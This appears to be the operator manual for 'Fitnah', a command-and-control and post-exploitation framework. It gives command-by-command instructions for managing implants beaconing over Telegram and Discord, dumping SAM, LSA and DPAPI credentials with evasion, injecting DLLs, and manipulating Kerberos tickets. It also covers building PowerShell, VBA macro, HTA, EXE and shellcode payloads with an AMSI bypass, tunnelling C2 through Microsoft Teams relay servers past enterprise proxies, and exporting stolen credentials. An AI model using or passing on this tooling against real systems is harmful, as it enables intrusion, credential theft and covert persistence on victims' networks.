# Operator Guide

Complete reference for the Fitnah REPL and all operator commands.

---

## Starting the Framework

```bash
python -m fitnah
```

The REPL prompt shows:
```
fitnah[session:WIN10-abc123]> _
       ^^^^^^^^^^^^^^^^
       active session (if any)
```

Use `Tab` for command completion. `↑`/`↓` for history. `Ctrl+C` cancels a running plugin without crashing.

---

## Session Management

### List sessions

```
sessions
```

Output:
```
ID          HOSTNAME    OS            PID    LAST SEEN     TRANSPORT
abc123      WIN10       Windows 10    4212   12s ago       telegram
def456      SRV2019     Windows 2019  8801   2m ago        discord
```

### Attach to a session

```
use abc123
use WIN10          # partial match on hostname
```

### Detach (keep session alive)

```
back
```

### Kill a session (terminate implant)

```
kill abc123
```

### Show session details

```
info
info abc123
```

### Refresh stale sessions

```
sessions --refresh
```

---

## Running Plugins

### Basic run

```
run <plugin_name>
run <plugin_name> param1=value1 param2=value2
```

### Examples

```
run sysinfo
run screenshot
run dump_sam method=regapi
run dump_sam method=all evasion=true extended=true
run shell_exec cmd="net user /domain"
run port_scan target=192.168.1.0/24 ports=22,80,443,445,8080-8090
run bof_exec name=whoami
run ticket_manipulation ticket_type=triage
```

### Pass boolean params

```
run dump_sam evasion=true cleanup=false
run port_scan udp=true
```

### Pass base64 data

```
run dll_inject pid=1234 dll_b64=TVqQAAMAAAAEAAAA...
```

### Get plugin help

```
help dump_sam
help ticket_manipulation
```

Output:
```
[dump_sam] v1.0.0 — Advanced credential dumping with multiple methods
Author : fitnah-team
MITRE  : T1003.002

  method               (optional, default='auto') — Dumping method: auto | regapi | direct | vss | memory | lsadump | all
  out_dir              (optional, default='')     — Override output directory
  evasion              (optional, default=True)   — Enable evasion techniques
  extended             (optional, default=False)  — Include LSA, DPAPI, cached creds
  cleanup              (optional, default=True)   — Clean up temp files
  max_retries          (optional, default=3)      — Max retry attempts
```

---

## Plugin Discovery

### Search plugins

```
search kerberos
search creds
search inject
search T1003
```

### List all plugins by category

```
plugins
plugins recon
plugins credential_access
```

### Hot-reload plugins (no restart needed)

```
reload
```

Reload picks up any new `.py` files in `fitnah/plugins/` and re-imports changed ones. Running sessions are unaffected.

---

## Loot Database

All plugin output with `loot_kind` set is automatically saved to `data/loot.db`.

### Query loot

```
loot                                  # all entries
loot -q credential                    # filter by kind
loot -q screenshot
loot -q golden_ticket
loot -s WIN10                         # filter by session/hostname
loot --since 2h                       # entries from last 2 hours
loot --limit 20
```

### Export loot

```
loot --export csv --out creds.csv
loot --export json --out dump.json
loot -q credential --export csv --out creds.csv
```

### Clear loot (destructive — prompts for confirmation)

```
loot --clear
```

---

## Builder

Build payloads for delivery to targets. The builder runs on the operator machine — it never runs on the implant.

### PowerShell stager (most common)

```
builder -f ps1 -a <agent_id>
builder -f ps1 -a abc123 --sleep 10 --jitter 15
```

### Advanced PS1 (AMSI bypass included)

```
builder -f https-ps1 -a abc123 --profile jquery
```

### VBA macro (for Office documents)

```
builder -f vba -a abc123
```

### HTA (HTML Application)

```
builder -f hta -a abc123
```

### EXE implant (requires mingw-w64)

```
builder -f exe -a abc123 --arch x64 --encrypt aes-256-gcm
```

### DLL implant

```
builder -f dll -a abc123
```

### Raw shellcode (requires donut)

```
builder -f shellcode -a abc123 --compress
```

### With mTLS cert baked in

```
builder -f exe -a abc123 --mtls
```

### Turnt relay binary

```
builder -f turnt-relay --os windows --arch amd64
builder -f turnt-relay --list          # show bundled assets
```

### Output location

All payloads go to `build/` by default. Override:

```
builder -f ps1 -a abc123 --out /tmp/payload
```

---

## Turnt TURN-Tunnel

Routes C2 through Microsoft Teams relay servers — works through any enterprise proxy.

### Auto-mode (recommended)

```
tunnel pivot
```

This: extracts Teams TURN credentials → uploads relay binary → completes SDP handshake automatically.

### Manual mode (step by step)

```
# 1. Extract Teams TURN creds from target
run turnt_credentials

# 2. Build relay binary
builder -f turnt-relay --os windows --arch amd64

# 3. Upload relay to target
run turnt_relay action=upload

# 4. Get SDP offer from target
tunnel offer

# 5. Paste offer into relay plugin
run turnt_relay action=start offer=<base64_offer>

# 6. Complete handshake
tunnel start <answer>

# 7. Verify tunnel is alive
status
```

### Use SOCKS5 proxy through tunnel

Once tunnel is live, a SOCKS5 proxy opens on `:1080`:

```bash
proxychains nmap -sT 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24
```

---

## Audit Log

Every command, plugin run, and loot capture is appended to `data/audit.jsonl`. Read-only — never truncated during operation.

```bash
# View recent entries
tail -f data/audit.jsonl | python -m json.tool
```

### Entries look like

```json
{"ts":"2025-06-18T14:22:01Z","op":"shadow","session":"abc123","action":"run","plugin":"dump_sam","params":{"method":"all"}}
{"ts":"2025-06-18T14:22:08Z","op":"shadow","session":"abc123","action":"loot","kind":"credential","hostname":"WIN10","bytes":1240}
```

---

## Transport Status

```
status
```

Output:
```
TRANSPORT    STATE     PRIORITY   LAST MSG
telegram     ALIVE     0          4s ago
discord      STANDBY   1          —
turnt        ALIVE     2          11s ago
http         ALIVE     —          7s ago
```

---

## Projects (FuzzBunch-style workspaces)

Organize multiple engagements without loot cross-contamination.

```
project new "ClientCorp Q3"
project list
project use 2
project info
```

Each project gets its own loot partition and audit log section.

---

## OPSEC Check

Scan the operator machine for analysis tools before sensitive operations:

```
opsec
```

Returns a threat level (0–100) and list of detected tools (debuggers, AV, sandboxes, VMs). Abort if level > 30 in production.

---

## Configuration Changes

Edit `config/framework.yaml` then:

```
config reload
```

No restart needed. Transport credentials cannot be hot-reloaded — restart for those.

---

## Keyboard Shortcuts

| Key | Action |
|---|---|
| `Tab` | Command/plugin completion |
| `↑` / `↓` | Command history |
| `Ctrl+C` | Cancel running plugin |
| `Ctrl+D` | Exit REPL |
| `Ctrl+L` | Clear screen |

---

## Exiting

```
exit
quit
```

Active sessions are preserved — implants continue beaconing. Reconnect with `python -m fitnah` to resume.
